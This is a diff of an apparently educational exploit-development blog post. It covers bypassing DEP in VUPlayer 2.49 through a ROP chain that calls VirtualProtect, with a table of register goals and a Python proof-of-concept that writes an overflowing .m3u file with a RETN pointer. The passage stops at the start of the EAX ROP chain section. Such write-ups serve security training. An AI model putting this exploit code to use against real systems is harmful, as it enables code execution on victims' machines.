@@ -111,16 +111,70 @@ There are apparently a lot of different ways to disable DEP. FuzzySec has a nice
 0x00501154 : kernel32!loadlibrarya | 0x7569de35 | startnull,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
 ```
 
-Ordinarily since they persist across the most versions of Windows, I'd like to either use `VirtualProtect` or `VirtualAlloc`. It looks like we only have pointers for `VirtualProtect` available to us, so that will be our weapon of choice. I used the pointer at `0x1060e25c`. 
+Ordinarily, since they persist across the most versions of Windows, I'd like to either use `VirtualProtect` or `VirtualAlloc`. It looks like we only have pointers for `VirtualProtect` available to us, so that will be our weapon of choice. I used the pointer at `0x1060e25c`. 
 
-Now that we have our function picked out, let's look at the values we need to call it and what it actually does. Consulting the [MSDN documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?redirectedfrom=MSDN), we see the structure of the function is as follows: 
+Now that we have our function picked out, let's look at the values we need to call it and what it actually does. Consulting the [MSDN documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?redirectedfrom=MSDN) and FuzzySec's blogpost we see the functiond definition and required paramters as follows: 
 ```cpp
-BOOL VirtualProtect(
-  LPVOID lpAddress,
-  SIZE_T dwSize,
-  DWORD  flNewProtect,
-  PDWORD lpflOldProtect
+Structure:                                 Parameters:
+
+BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
+  _In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
+  _In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x201)
+  _In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
+  _Out_  PDWORD lpflOldProtect       =>    A writable pointer
 );
 ```
+
+This is extremely helpful. Since we're working with a stack, we know we'll need to put these parameters on the stack in **reverse** order. Our plan of attack will roughly look like this:
++ Load registers strategically with parameters we need
++ call a `PUSHAD` to push all of the register values onto the stack at once
+
+Considering all of these facts, our goals can be summarized as thus following from what FuzzySec writes about the goals of his `VirtualAlloc` call: 
+```
+GOALS
+EAX 90909090 => Nop                                              
+ECX <writeable pointer> => flProtect                                
+EDX 00000040 => flNewProtect                                   
+EBX 00000201 => dwSize                                           
+ESP ???????? => Leave as is                                 
+EBP ???????? => Call to ESP (jmp, call, push,..)              
+ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+EDI 10101008 => ROP-Nop same as EIP
+```
+
+`VirtualProtect` has different order of parameters but overall, it is very similar to `VirtualAlloc` so we can adjust the goals outlined in FuzzySec's blogpost subtly. 
+
+The value for the `dwSize` parameter was automatically chosen by a mona operation at some point it is more than enough space (513 bytes) for our calculator shellcode so I just left it. 
+
+Let's go ahead and add these to our POC to keep us organized. 
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop                                                
+# ECX <writeable pointer> => flProtect                                 
+# EDX 00000040 => flNewProtect                             
+# EBX 00000201 => dwSize                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..)                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
+
+Let's just knock all of these goals out in order starting with the EAX goal. 
+
+## EAX ROP Chain
 
 
